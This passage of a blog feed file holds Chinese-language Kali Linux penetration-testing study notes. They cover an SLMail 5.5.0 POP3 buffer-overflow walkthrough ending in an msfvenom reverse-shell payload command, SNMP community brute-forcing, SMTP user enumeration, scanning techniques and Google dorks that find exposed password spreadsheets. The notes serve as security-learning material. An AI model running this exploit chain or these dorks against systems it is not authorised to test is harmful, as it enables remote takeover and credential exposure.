      <link href="/2020/09/19/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
      <url>/2020/09/19/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul><li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据</li><li>成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</li></ul><a id="more"></a><h2 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h2><ul><li>源码审计</li><li>逆向工程</li><li>模糊测试<ul><li>向程序堆栈发送半随机的数据，根据内存变化判断溢出</li><li>数据生成器：生成随机、半随机数据</li><li>测试工具：识别溢出漏洞</li></ul></li></ul><h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><ul><li><p>SLMail 5.5.0 Mail Server</p><ul><li>POP3 PASS命令存在缓冲区溢出漏洞</li><li>无需身份验证远程代码执行</li><li>防护机制：<ul><li>DEP: 阻止代码从数据页被执行</li><li>ASLR: 随机内存地址加载执行程序和DLL,每次重启地址变化</li></ul></li></ul><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><ol><li><p>测试PASS命令接收到大量数据时是否会溢出</p></li><li><p>找到精确溢出到EIP的4个字节</p><ul><li><p>二分法 </p></li><li><p>唯一字符串法</p></li></ul></li></ol><ul><li>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2700</li><li>上一条命令即<code>msf-pattern_create -l 2700</code></li><li>然后使用<code>msf-pattern_offset -q Di9D</code></li></ul><ol start="3"><li>找出坏字符</li></ol></li><li><p>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</p><ul><li>返回地址、Shellcode、buffer中都不能出现坏字符</li><li>null (0x00)空字符，用于终止字符串的拷贝操作</li><li>return (0x0D) 回车操作，表示POP3 PASS命令输入完成</li><li>思路：发送0x00-0xff 256个字符，查找所有坏字符</li></ul><ol start="4"><li>重定向数据流</li></ol></li><li><p>用ESP地址替换EIP的值，但是ESP地址变化，不可硬编码。SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</p><ul><li>在内存中寻找地址固定的系统模块，在模块中寻找JMP ESP指令的地址跳转，再由该指令简介跳转到ESP，从而执行shellcode</li><li>mona.py脚本识别内存模块，搜索“return address”是JMP ESP指令的模块</li><li>寻找无DEP、ALSR保护的内存地址</li><li>内存地址不包含坏字符</li></ul></li><li><p>寻找不受保护的系统模块</p><ul><li>!mona modules</li></ul></li><li><p>将汇编指令jmp esp转换为二进制</p><ul><li><code>./nasm_shell.rb</code>或 <code>msf-nasm_shell</code></li><li>FFE4</li></ul></li><li><p>在模块中搜索FFE4指令</p><ul><li><code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code></li><li>选择不包含坏字符的内存地址</li></ul></li><li><p>在该地址设置断点</p></li><li><p>重发buffer</p><ol start="5"><li>生成ShellCode</li></ol></li><li><p>在msfvenom查找相应的payload</p><ul><li><code>msfvenom --list payloads|grep windows|grep reverse_tcp</code></li></ul></li><li><p>查看该Payload生成需要哪些参数</p><ul><li><code>msfvenom -p windows/shell_reverse_tcp --list-options</code></li></ul></li><li><p>生成Payload</p><ul><li><code>msfvenom --platform Windows -b &#39;\x00\x01\x0d&#39; -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.0.112 LPORT=4444 -f py</code></li></ul><ol start="6"><li>在本地侦听4444端口，执行脚本，拿到控制权</li></ol></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>汇编指令<ul><li>JMP XXX         跳转到某寄存器</li><li>ADD XXX,12  XXX寄存器后移12位 </li></ul></li><li>注意fuzzing要步步为营，否则很容易混乱。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SLMail缓冲区溢出实践</title>
      <link href="/2020/09/18/SLMail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E8%B7%B5/"/>
      <url>/2020/09/18/SLMail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Windows系统</li><li><a href="https://slmail.software.informer.com/download/" target="_blank" rel="noopener">SLMail5.5.0</a></li><li><a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml" target="_blank" rel="noopener">ImmunityDebugger1.85</a></li><li><a href="https://raw.githubusercontent.com/corelan/mona/master/mona.py" target="_blank" rel="noopener">mona.py</a></li></ul><p>mona.py需要放在ImmunityDebugger的安装目录的DebuggerPyCommands文件夹</p><a id="more"></a><p>（国庆节复习来补）</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描</title>
      <link href="/2020/09/17/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/17/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ul><li><p>发现漏洞</p><ul><li>基于端口服务扫描结果版本信息（速度慢）</li><li>搜索已公开的漏洞数据库（数量大）</li><li>使用弱点扫描器实现漏洞管理</li></ul></li><li><p>服务弱点查找</p><ul><li><p>exploit-db</p></li><li><p>rapid7</p></li><li><p><code>searchsploit tomcat</code></p><ul><li>(/usr/share/exploitdb/exploits)</li></ul></li><li><p>shellstorm</p><a id="more"></a></li></ul></li></ul><h2 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h2><ul><li>信息收集：<ul><li>扫描发现网络IP、OS、服务、配置、漏洞</li><li>能力需求：定义扫描方式内容和目标</li></ul></li><li>信息管理<ul><li>格式化信息，并进行筛选、分组、定义优先级</li><li>能力需求：资产分组、指定所有者、向所有者报告漏洞</li></ul></li><li>信息输出<ul><li>向不同层级的人群展示足够的信息量</li><li>能力需求：生成报告、导出数据、与SIEM集成</li></ul></li></ul><h2 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h2><ul><li>主动扫描<ul><li>有身份验证</li><li>无身份验证</li></ul></li><li>被动扫描<ul><li>镜像端口抓包</li><li>其它来源输入</li></ul></li><li>基于Agent的扫描<ul><li>支持平台有限</li></ul></li></ul><h2 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h2><ul><li><p>CVSS(Common Vulnerability Scoring System)</p><ul><li>通用漏洞评分系统——工业标准</li><li>描述安全漏洞严重程度的统一评分方案</li><li>Base Metric:基础的恒定不变的弱点权重</li><li>Temporal Metric:依赖时间因素的弱点权重</li><li>Environmental Metric:利用弱点的环境要求和实施难度的权重</li></ul></li><li><p>CVE(Common Vulnerabilities and Exposures)</p><ul><li><p>已公开的信息安全漏洞字典，统一的漏洞编号标准</p></li><li><p>MITRE公司负责维护（非盈利机构）</p></li><li><p>扫描器的大部分扫描项都对应一个CVE编号</p></li><li><p>实现不同厂商之间信息交换的统一标准</p></li><li><p>CVE发布流程</p><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List——CVE-2008-4250</li><li>MITRE负责对内容进行编辑维护</li></ul></li><li><p>很多厂商维护自己的Vulnerability Reference</p><ul><li>MS</li><li>MSKB</li></ul></li><li><p>其它Vulnerability Reference</p><ul><li>CERT TA08-297A</li><li>BID 31874</li><li>IAVM 2008-A-0081</li><li>OVAL OVAL6093</li></ul></li><li><p>OVAL(Open Vulnerability and Assessment language)</p><ul><li>描述漏洞检测方法的机器可识别语言</li><li>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</li><li>OVAL使用XML语言描述，包含了严密的语法逻辑</li></ul></li><li><p>CCE</p><ul><li>描述软件配置缺陷的标准化格式</li></ul></li><li><p>CPE(Common Product Enumeration)</p><ul><li>信息技术产品，系统，软件包的结构化命名规范分类命名</li></ul></li><li><p>CWE(Common Weakness Enumeration)</p><ul><li>常见漏洞类型的字典</li></ul></li><li><p>SCAP(Security Content Automation Protocol)</p><ul><li>SCAP是一个集合了多重安全标准框架</li><li>六个元素：CVE、OVAL、CCE、CPE、CVSS、XCCDF</li><li>目的是以标准方法展示和操作安全数据</li><li>由NIST负责维护</li></ul></li></ul><h2 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h2><ul><li>周期性扫描跟踪漏洞</li><li>高危漏洞优先处理</li><li>扫描注意事项</li><li>漏洞管理三要素<ul><li>准确性</li><li>时间</li><li>资源</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-防火墙与负载均衡识别</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><ul><li>通过检查回包，可能识别端口是否经过防火墙过滤</li><li>设备多种多样，结果存在一定误差</li><li>Send respond type</li><li>scapy脚本</li><li><code>nmap -sA 192.168.0.117 -p 22</code></li><li><img src="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/table.png" alt></li></ul><a id="more"></a><h2 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a>负载均衡识别</h2><ul><li>广域网负载均衡<ul><li>DNS轮询，一个DNS对应多个IP</li><li>基于地理位置的DNS解析</li><li>根据解析速度和链路状态的DNS解析</li></ul></li><li>HTTP-Load balancing<ul><li>Nginx</li><li>Apache</li></ul></li></ul><figure class="hljs highlight plain"><figcaption><span>www.baidu.com```(load balancing detect)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lbd"><br><br><br>## WAF识别<br><br>- Web应用防火墙<br><br>- wafw00f -l<br><br>- &#96;&#96;&#96;wafw00f http:&#x2F;&#x2F;www.microsoft.com<br></code></pre></td></tr></table></figure><ul><li><code>nmap www.microsoft.com --script=http-waf-detect.nse</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-OS识别、SNMP、SMB、SMTP扫描</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-OS%E8%AF%86%E5%88%AB%E3%80%81SNMP%E3%80%81SMB%E3%80%81SMTP%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-OS%E8%AF%86%E5%88%AB%E3%80%81SNMP%E3%80%81SMB%E3%80%81SMTP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><ul><li>操作系统识别技术<ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul></li></ul><h3 id="主动识别"><a href="#主动识别" class="headerlink" title="主动识别"></a>主动识别</h3><ul><li>TTL起始值<ul><li>Windows:128(65-128)</li><li>Linux/Unix:64(1-64)</li><li>某些Unix:255</li></ul></li></ul><a id="more"></a><ul><li><p>Scapy脚本</p></li><li><p>nmap使用多种技术识别操作系统</p><figure class="hljs highlight plain"><figcaption><span>-O 192.168.0.114```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nmap"><br>- &#96;&#96;&#96;xprobe2 192.168.0.114<br></code></pre></td></tr></table></figure></li></ul><h3 id="被动识别"><a href="#被动识别" class="headerlink" title="被动识别"></a>被动识别</h3><ul><li><p>IDS</p></li><li><p>抓包分析</p></li><li><p>被动扫描</p></li><li><p>p0f</p><ul><li>结合ARP地址欺骗识别全网OS</li></ul></li></ul><h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><ul><li><p>snmp</p><ul><li>简单网络管理协议161 162端口 (DHCP67 68)</li><li>经常被错误配置</li><li>public /private /manager</li></ul></li><li><p>MIB Tree</p><ul><li>SNMP Management Information Base(MIB)</li><li>树形的网络设备管理功能数据库</li><li>1.3.6.1.4.1.77.1.2.25</li></ul></li><li><p><code>onesixtyone 1.1.1.1 public</code>(主要用于目标是不是使用public等若community)</p></li><li><p><code>onesixtyone -c dict.txt -i hosts -o my.log -w 100</code>暴破</p><ul><li><code>dpkg -L onesixtyone</code>找到字典位置</li></ul></li><li><p><code>snmpwalk 192.168.0.114 -c public -v 2c</code></p></li></ul><h3 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h3><ul><li><p>Server Message Block 协议</p><ul><li>微软历史上出现安全问题最多的协议</li><li>实现复杂</li><li>默认开放</li><li>文件共享</li><li>空会话未身份认证访问(SMB1)<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器名</li><li>用户、组SID</li><li>MS08067</li></ul></li></ul></li><li><p><code>nmap 192.168.1.132 -p139,445 --script=smb-os-discovery.nse</code></p></li><li><p>nmap scripts</p></li><li><p>```nbtscan -r 192.168.0.117``</p></li></ul><h3 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h3><ul><li><p>nc -vn 1.1.1.1 25</p><ul><li>VRFY root</li></ul></li><li><p><code>nmap smtp.163.com -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}</code></p></li><li><p><code>nmap smtp.163.com -p25 -script=smtp-open-realy.nse</code></p></li><li><p><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></p></li><li><p>scapy脚本编写</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-服务扫描</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h2><ul><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul><a id="more"></a></li></ul><h3 id="Banner"><a href="#Banner" class="headerlink" title="Banner"></a>Banner</h3><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li><li>连接建立后直接获取banner</li><li>另类服务识别方法<ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li>SNMP<ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li></ul></li><li>识别和绕过防火墙筛选</li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul><li><p><code>nc -nv 1.1.1.1 22</code></p></li><li><pre><code class="python"><span class="meta">&gt;&gt;&gt; </span>banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span class="meta">&gt;&gt;&gt; </span>banner.connect((<span class="string">"192.168.0.114"</span>,<span class="number">21</span>))<span class="meta">&gt;&gt;&gt; </span>banner.recv(<span class="number">4096</span>)<span class="string">'220 (vsFTPd 2.3.4)\r\n'</span><span class="meta">&gt;&gt;&gt; </span>banner.close()<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>- &#96;&#96;&#96;dmitry -pb 192.168.0.114<br></code></pre></td></tr></table></figure></code></pre></li><li><p><code>nmap -sT 192.168.0.114</code></p></li><li><p><code>amap -B 192.168.0.114 21</code></p></li><li><p><code>nmap 192.168.0.114 -p1-100 -sV</code> (最强大且常用)</p></li><li><p><code>amap 192.168.0.114 1-100</code></p></li><li><p><code>amap 192.168.0.114 1-100 -qb</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-端口扫描</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>端口对应网络服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现开放的端口</li><li>更具体的攻击面</li></ul><a id="more"></a><h3 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h3><ul><li><p>假设ICMP port-unreachable 响应代表端口关闭</p><ul><li>目标系统不响应ICMP port-unreachable时，可能产生误判</li></ul></li><li><p>Scapy UDP Scan脚本</p><ul><li>端口关闭：unreachable</li><li>端口开放：没有回包</li><li>了解每一种基于UDP的应用层包结构很有帮助</li><li>与三层相同的技术</li><li>误判</li></ul></li><li><p>nmap -sU x.x.x.x  常见1000端口</p></li><li><p>nmap -sU x.x.x.x -p xx 指定端口</p></li></ul><h3 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h3><ul><li>基于连接的协议</li><li>三次握手</li><li>隐蔽扫描（不建立握手）</li><li>僵尸扫描</li><li>全连接扫描</li><li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li></ul><h4 id="隐蔽扫描——SYN"><a href="#隐蔽扫描——SYN" class="headerlink" title="隐蔽扫描——SYN"></a>隐蔽扫描——SYN</h4><ul><li>不建立完整连接</li><li>应用日志不记录扫描行为——隐蔽</li></ul><h4 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h4><ul><li>极度隐蔽</li><li>实时条件苛刻</li><li>必须可伪造源IP地址</li><li>僵尸机条件：<ul><li>必须是闲置系统</li><li>系统使用递增的IPID（IP包头的id字段）<ul><li>0</li><li>随机</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集--主机发现</title>
      <link href="/2020/09/13/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
      <url>/2020/09/13/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><ul><li><p>直接与目标系统交互通信</p></li><li><p>无法避免留下访问痕迹</p></li><li><p>使用受控的第三方电脑进行探测</p><ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准备</li><li>使用噪声迷惑目标，淹没真实的探测流量</li></ul></li><li><p>扫描</p><ul><li>发送不同的探测，根据返回结果判断目标状态</li></ul><a id="more"></a></li></ul><h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><ul><li>识别活着的主机<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个IP地址列表</li><li>2、3、4层发现</li></ul><h2 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h2><ul><li><p>优点：扫描速度快，可靠。</p></li><li><p>缺点：不可路由</p></li><li><p>Arp协议</p><ul><li>抓包</li></ul></li><li><p>arping</p></li><li><p>arping 1.1.1.1 -c 1</p><ul><li>编写一个扫描本网段的脚本</li><li>编写一个扫描指定ip列表的脚本</li></ul></li><li><p>nmap -sn（nmap还发了一个反向域名解析请求）</p><ul><li>nmap -sn -iL</li></ul></li><li><p>Netdiscover</p><ul><li>专用于二层发现</li><li>可用于无线和交换网络</li><li>主动和被动探测<ul><li>主动：<ul><li>netdiscover -i eth0 -r 1.1.1.0/24</li><li>netdiscover -l iplist.txt</li></ul></li><li>被动：<ul><li>netdiscover -p</li></ul></li></ul></li></ul></li><li><p>Scapy</p><ul><li>Python库</li><li>也可作为单独的工具使用</li><li>抓包、分析、创建、修改、注入网络流量</li></ul></li><li><p>apt-get install python3-gnuplot</p></li><li><p>Scapy</p><ul><li>ARP().display()</li><li>sr1()</li><li>Python脚本</li></ul></li><li><p>在不同的环境下可使用的工具不确定。</p></li></ul><h1 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h1><ul><li><p>优点</p><ul><li>可路由</li><li>速度比较快</li></ul></li><li><p>缺点</p><ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li><p>IP、ICMP协议</p></li><li><p>ping</p></li><li><p>traceroute(发的UDP,IP段的TTL=0后会返回ICMP)，每一跳是路由器的内侧网口</p></li><li><p>ping -R返回的是外侧网口 <a href="https://blog.csdn.net/weixin_42714910/article/details/108351817" target="_blank" rel="noopener">点这里了解更多关于ping -R </a></p><ul><li>编写ping扫描网段脚本</li></ul></li><li><p>Scapy</p><ul><li>分别用shell和python编写ping扫描网段脚本<ul><li>读取文件扫描ip列表</li></ul></li></ul></li><li><p>nmap -sn</p><ul><li>如果ip是本网段的就是二层扫描，否则是三层扫描。</li><li>发送了2个ICMP请求，type是8和13.发送了两个TCP消息，一个443 SYN,一个80 ACK。</li><li>对于每个消息如果目标没有响应就会再发一遍。两遍都没有响应就判定host is down.</li></ul></li><li><p>fping</p><ul><li>fping支持地址段扫描</li><li>fping -g 192.168.1.100 192.168.1.200 -c 1</li></ul></li><li><p>Hping</p><ul><li>能够发送激活任意TCP/IP包</li><li>功能强大但每次只能扫描一个目标</li></ul></li></ul><h1 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h1><ul><li><p>优点</p><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以返现所有端口都被过滤的主机</li></ul></li><li><p>缺点</p><ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li><p>TCP</p><ul><li>未经请求的ACK——RST</li><li>SYN——SYN/ACK、RST</li></ul></li><li><p>UDP</p><ul><li>ICMP端口不可达、一去不复返</li></ul></li><li><p>ACK——TCP Port——RST</p><ul><li>Scapy</li><li>Python脚本</li></ul></li><li><p>nmap - x.x.x.x -PU53333 -sn  UDP扫描53333端口</p></li><li><p>nmap - x.x.x.x -PA53333 -sn  ACK扫描53333端口 (PS PA PU PY(SCTP))</p></li><li><p>hping3 –udp xxx -c 1</p></li></ul><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><ul><li>|egrep -v “xxx”<ul><li>除符合xxx的字段</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking、Recon-ng</title>
      <link href="/2020/08/31/GoogleHacking%E3%80%81Recon-ng/"/>
      <url>/2020/08/31/GoogleHacking%E3%80%81Recon-ng/</url>
      
        <content type="html"><![CDATA[<h1 id="搜索引擎使用技巧"><a href="#搜索引擎使用技巧" class="headerlink" title="搜索引擎使用技巧"></a>搜索引擎使用技巧</h1><ul><li><p>+-</p></li><li><p>“ “</p></li><li><p>intitle:</p></li><li><p>intext:</p></li><li><p>site:</p></li><li><p>inurl:</p></li><li><p>filetype:</p><a id="more"></a></li></ul><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>inurl:”level/15/exec/show”</p><p>intitle:”netbotz appliance” “ok”</p><p>inurl:/admin/login.php</p><p>inurl:qq.txt</p><p>filetype:xls “username|password”</p><p>inurl:ftp filetype:xls </p><p>inurl:ftp “password” filetype:xls site:baidu.com</p><h1 id="其它搜索引擎"><a href="#其它搜索引擎" class="headerlink" title="其它搜索引擎"></a>其它搜索引擎</h1><p>duckduckgo</p><p>yandex</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>theHarvester（OSINT gathering）</li><li>metagoofil（search and download specific filetypes）</li><li>Tmux 是一个终端复用器（terminal multiplexer）</li><li>meltago（图形界面）</li></ul><h1 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h1><ul><li>社交网络</li><li>工商注册</li><li>新闻组/论坛</li><li>招聘网站</li><li><a href="http://www.archive.org/web/web/php" target="_blank" rel="noopener">http://www.archive.org/web/web/php</a></li></ul><h1 id="个人专属密码字典"><a href="#个人专属密码字典" class="headerlink" title="个人专属密码字典"></a>个人专属密码字典</h1><ul><li><p>按个人信息生成其专属的密码字典</p></li><li><p>CUPP——Common User Password Profile</p><ul><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i</li></ul></li></ul><h1 id="METADATA"><a href="#METADATA" class="headerlink" title="METADATA"></a>METADATA</h1><ul><li><p>Exif图片信息:</p><ul><li>exiftool x.jpg</li></ul></li><li><p>Foca(Windows)</p></li></ul><h1 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h1><ul><li>全特性Web侦察框架</li><li>基于Python开发</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被动信息收集-DNS与SHODAN</title>
      <link href="/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/"/>
      <url>/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/</url>
      
